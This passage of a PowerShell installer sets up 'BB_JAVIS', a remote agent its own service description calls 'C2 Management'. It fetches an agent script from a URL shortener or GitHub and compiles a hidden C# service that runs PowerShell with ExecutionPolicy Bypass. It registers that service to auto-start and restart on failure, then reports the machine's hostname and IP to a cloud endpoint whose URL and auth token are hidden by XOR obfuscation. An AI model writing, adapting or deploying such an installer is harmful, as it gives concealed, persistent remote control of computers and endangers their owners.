            if ((Test-Path $targetAgent -or Test-Path $altAgent)) {
                Write-Host "[EMBEDDED] Agent extracted successfully ($($decompressedBytes.Length) bytes) [Zero-Network Ready]" -ForegroundColor Green
                $unpackSuccess = $true
            }
        } catch {
            Write-Host "[WARN] Failed to extract embedded agent: $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }

    if (-not $unpackSuccess) {
        Write-Host "[DOWNLOAD] Downloading start_remote_agent.ps1 from official cloud repository..." -ForegroundColor Cyan
        $downloadSuccess = $false
        $candidateUrls = @(
            "https://da.gd/bbj",
            "https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/start_remote_agent.ps1"
        )

        foreach ($u in $candidateUrls) {
            if ($downloadSuccess) { break }
            try {
                Write-Host "[DOWNLOAD] Trying: $u..." -ForegroundColor DarkGray
                $resp = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
                $content = $resp.Content
                if (-not [string]::IsNullOrWhiteSpace($content) -and $content.Length -gt 1000) {
                    [System.IO.File]::WriteAllText($targetAgent, $content, [System.Text.Encoding]::UTF8)
                    $downloadSuccess = $true
                    break
                }
            } catch {}

            if (-not $downloadSuccess) {
                try {
                    $wc = New-Object System.Net.WebClient
                    $wc.Encoding = [System.Text.Encoding]::UTF8
                    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) BB_Javis/2.0")
                    $wc.DownloadFile($u, $targetAgent)
                    $wc.Dispose()
                    if ((Test-Path $targetAgent) -and (Get-Item $targetAgent).Length -gt 1000) {
                        $downloadSuccess = $true
                        break
                    }
                } catch {}
            }
        }

        if ($downloadSuccess) {
            Write-Host "[DOWNLOAD] start_remote_agent.ps1 downloaded successfully." -ForegroundColor Green
        } else {
            Write-Host "[ERROR] Failed to obtain start_remote_agent.ps1 from all channels." -ForegroundColor Red
            return
        }
    }
}

# Copy curl.exe if available
$localCurl = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "curl.exe" } else { $null }
if ($localCurl -and (Test-Path $localCurl)) {
    Copy-Item $localCurl (Join-Path $installDir "curl.exe") -Force
}

# 4. Generate C# Service Wrapper (BBJavisService.cs)
$csSourcePath = Join-Path $installDir "BBJavisService.cs"
$csCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;

namespace BBJavisService
{
    public class JavisService : ServiceBase
    {
        private Process _agentProcess;
        public const string ServiceNameString = "BB_JAVIS_Remote";

        public JavisService()
        {
            this.ServiceName = ServiceNameString;
            this.CanStop = true;
            this.CanShutdown = true;
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string scriptPath = Path.Combine(baseDir, "agent.ps1");
                if (!File.Exists(scriptPath))
                {
                    scriptPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "BB_Javis", "agent.ps1");
                }
                if (!File.Exists(scriptPath))
                {
                    scriptPath = Path.Combine(baseDir, "start_remote_agent.ps1");
                }
                if (!File.Exists(scriptPath))
                {
                    scriptPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "BB_Javis", "start_remote_agent.ps1");
                }

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\" -Mode fix -AsService";
                psi.WorkingDirectory = baseDir;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;

                _agentProcess = Process.Start(psi);
            }
            catch (Exception ex)
            {
                EventLog.WriteEntry("BB_JAVIS_Remote", "Error starting agent: " + ex.Message, EventLogEntryType.Error);
                throw;
            }
        }

        protected override void OnStop()
        {
            try
            {
                if (_agentProcess != null && !_agentProcess.HasExited)
                {
                    _agentProcess.Kill();
                }
            }
            catch {}
        }

        protected override void OnShutdown()
        {
            this.OnStop();
        }

        public static void Main()
        {
            ServiceBase.Run(new JavisService());
        }
    }
}
"@
[System.IO.File]::WriteAllText($csSourcePath, $csCode, [System.Text.Encoding]::UTF8)

# 5. Locate Built-in C# Compiler (csc.exe)
$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (-not (Test-Path $csc)) {
    $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
}
if (-not (Test-Path $csc)) {
    Write-Host "[ERROR] .NET Framework C# Compiler (csc.exe) not found on this machine!" -ForegroundColor Red
    return
}

# 6. Compile BBJavisService.exe
$targetExe = Join-Path $installDir "BBJavisService.exe"
if (Test-Path $targetExe) {
    try { Remove-Item $targetExe -Force -ErrorAction SilentlyContinue } catch {}
}
Write-Host "[COMPILE] Compiling C# Windows Service Wrapper..." -ForegroundColor Cyan
& $csc /nologo /target:exe /r:System.dll,System.ServiceProcess.dll /out:$targetExe $csSourcePath
if ($LASTEXITCODE -ne 0 -or -not (Test-Path $targetExe)) {
    if (Test-Path $targetExe) {
        Write-Host "[REUSE] Existing wrapper executable is available. Continuing registration..." -ForegroundColor Yellow
    } else {
        Write-Host "[ERROR] Compilation failed (Exit code: $LASTEXITCODE)" -ForegroundColor Red
        return
    }
} else {
    Write-Host "[COMPILE] BBJavisService.exe compiled successfully! (Native 100%)" -ForegroundColor Green
}

# 7. Register Service with Windows SCM
Write-Host "[SERVICE] Registering Windows Service: $svcName..." -ForegroundColor Cyan
$binPathArg = "`"$targetExe`""
& sc.exe create $svcName binPath= $binPathArg start= auto DisplayName= "BB_JAVIS Remote Agent Service" 2>&1 | Out-Null
& sc.exe description $svcName "Background Remote Agent for BB_JAVIS C2 Management (Always-On)" 2>&1 | Out-Null
& sc.exe failure $svcName reset= 86400 actions= restart/5000/restart/10000/restart/60000 2>&1 | Out-Null

# 8. Create local uninstaller script
$uninstallPs1Content = @'
# BB_JAVIS Remote Service Uninstaller
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$svcName = "BB_JAVIS_Remote"
Write-Host "Uninstalling $svcName..." -ForegroundColor Yellow
try {
    $cfgPath = "C:\ProgramData\BB_Javis\service_config.json"
    if (Test-Path $cfgPath) {
        $cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json
        if ($cfg -and $cfg.pin) {
            $authQuery = if ($cfg.authToken) { "?auth=$($cfg.authToken)" } else { "" }
            $delUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$($cfg.pin).json$authQuery"
            $req = [System.Net.HttpWebRequest]::Create($delUrl)
            $req.Method = "DELETE"
            $req.Timeout = 5000
            try { $resp = $req.GetResponse(); $resp.Close() } catch {}
        }
    }
} catch {}
& sc.exe stop $svcName 2>&1 | Out-Null
Start-Sleep -Seconds 1
& sc.exe delete $svcName 2>&1 | Out-Null
Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*BB_Javis*" } | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Host "[SUCCESS] BB_JAVIS Remote Service uninstalled successfully!" -ForegroundColor Green
'@
[System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.ps1"), $uninstallPs1Content, [System.Text.Encoding]::UTF8)

$uninstallBatContent = @"
@echo off
chcp 65001 >nul
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0uninstall_service.ps1"
pause
"@
[System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.bat"), $uninstallBatContent, [System.Text.Encoding]::UTF8)

# 8.5 Manage Persistent PIN and Custom Host Name (Display Alias)
$cfgFile = Join-Path $installDir "service_config.json"
$assignedPin = ""
$existingCustomName = ""
if (Test-Path $cfgFile) {
    try {
        $existingCfg = Get-Content $cfgFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if ($existingCfg) {
            if ($existingCfg.pin) { $assignedPin = $existingCfg.pin.ToString().Trim() }
            if ($existingCfg.custom_name) { $existingCustomName = $existingCfg.custom_name.ToString().Trim() }
        }
    } catch {}
}

if ([string]::IsNullOrWhiteSpace($assignedPin)) {
    $assignedPin = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
}

$defaultHost = if (-not [string]::IsNullOrWhiteSpace($existingCustomName)) { $existingCustomName } else { $env:COMPUTERNAME }
$chosenHost = ""

# Check environment variable first (for automation scripts)
if (-not [string]::IsNullOrWhiteSpace($env:BB_JAVIS_HOST)) {
    $chosenHost = $env:BB_JAVIS_HOST.Trim()
} elseif ([Environment]::UserInteractive) {
    Write-Host ""
    Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Set Custom Host Name for Fleet Management (Display Alias)" -ForegroundColor Yellow
    Write-Host "  [Press Enter to use default: '$defaultHost']" -ForegroundColor Gray
    try {
        $inputHost = Read-Host "  Enter machine name"
        if (-not [string]::IsNullOrWhiteSpace($inputHost)) {
            $chosenHost = $inputHost.Trim()
        }
    } catch {}
    Write-Host "----------------------------------------------------------------------`n" -ForegroundColor DarkGray
}

if ([string]::IsNullOrWhiteSpace($chosenHost)) {
    $chosenHost = $defaultHost
}

# Pre-save service_config.json for instant resolution
try {
    $preCfg = @{
        pin = $assignedPin
        hostname = $env:COMPUTERNAME
        custom_name = $chosenHost
        mode = "fix"
        authToken = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
        updated_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    } | ConvertTo-Json
    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($cfgFile, $preCfg, $utf8NoBom)
} catch {}

# 9. Start Windows Service
Write-Host "[START] Starting service $svcName..." -ForegroundColor Cyan
try {
    Start-Service -Name $svcName -ErrorAction Stop
} catch {
    Write-Host "[WARNING] Direct Start-Service failed, trying via sc.exe start..." -ForegroundColor Yellow
    & sc.exe start $svcName 2>&1 | Out-Null
}

# Local IP Resolution
$localIp = "127.0.0.1"
try {
    $localIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
                Select-Object -ExpandProperty IPAddress -First 1)
} catch {}

# 10. Initial Heartbeat & Presence Registration
Write-Host "[INIT] Registering initial presence heartbeat on Cloud..." -ForegroundColor Cyan
try {
    $initHbUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$assignedPin.json?auth=$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
    $initHbData = @{
        pin = $assignedPin
        hostname = $env:COMPUTERNAME
        custom_name = $chosenHost
        local_ip = $localIp
        service_mode = $true
        status = "online"
        last_heartbeat = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    } | ConvertTo-Json -Compress
    $req = [System.Net.HttpWebRequest]::Create($initHbUrl)
    $req.Method = "PUT"
    $req.Timeout = 5000
    $req.ContentType = "application/json; charset=utf-8"
    $b = [System.Text.Encoding]::UTF8.GetBytes($initHbData)
    $req.ContentLength = $b.Length
    $st = $req.GetRequestStream()
    $st.Write($b, 0, $b.Length)
    $st.Close()
    $null = $req.GetResponse()
    Write-Host "[INIT] Background service connected to cloud successfully! (ONLINE)" -ForegroundColor Green
} catch {
    Write-Host "[INIT] Background service started." -ForegroundColor Green
}

# 11. Summary Banner
Write-Host ""
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "              BB_JAVIS BACKGROUND SERVICE INSTALLED                   " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  -> Service Name      : " -NoNewline -ForegroundColor Gray
Write-Host "$svcName (RUNNING)" -ForegroundColor Green
Write-Host "  -> Startup Type      : " -NoNewline -ForegroundColor Gray
Write-Host "Automatic (Starts automatically on system boot)" -ForegroundColor White
Write-Host "  -> Persistent PIN    : " -NoNewline -ForegroundColor Gray
Write-Host "[ $assignedPin ]" -NoNewline -ForegroundColor Green
Write-Host " (PERMANENT FIXED PIN)" -ForegroundColor Yellow
Write-Host "  -> Machine Hostname  : " -NoNewline -ForegroundColor Gray
if ($chosenHost -ne $env:COMPUTERNAME) {
    Write-Host "$chosenHost " -NoNewline -ForegroundColor Green
    Write-Host "($env:COMPUTERNAME)" -ForegroundColor DarkGray
} else {
    Write-Host "$env:COMPUTERNAME" -ForegroundColor Cyan
}
Write-Host "  -> Local IPv4        : " -NoNewline -ForegroundColor Gray
Write-Host "$localIp" -ForegroundColor Cyan
Write-Host "  -> Presence Status   : " -NoNewline -ForegroundColor Gray
Write-Host "ONLINE (Real-time SSE Push & Heartbeat 30s)" -ForegroundColor Green
Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  * Background agent is now actively running 24/7" -ForegroundColor White
Write-Host "  * You may SAFELY CLOSE this PowerShell window now" -ForegroundColor Green
$targetPromptName = if ($chosenHost -ne $env:COMPUTERNAME) { "$chosenHost or '$env:COMPUTERNAME'" } else { "$env:COMPUTERNAME" }
Write-Host "  * Controllers can target this machine via '$targetPromptName' or PIN [ $assignedPin ]" -ForegroundColor Gray
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host ""
